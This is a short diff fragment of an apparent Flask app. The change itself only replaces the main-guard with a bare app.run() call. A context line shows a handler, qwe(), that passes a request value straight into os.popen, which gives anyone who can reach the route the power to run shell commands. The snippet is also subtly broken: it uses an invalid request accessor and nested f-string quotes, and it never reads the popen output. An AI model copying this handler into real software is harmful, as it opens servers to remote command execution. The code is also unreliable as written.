@@ -11,5 +11,4 @@ def hello_world():
 def qwe():
     return f'Command: {os.popen(request.get('rudnic'))}'    
 
-if __name__ == '__main__':
-    app.run()
+app.run()
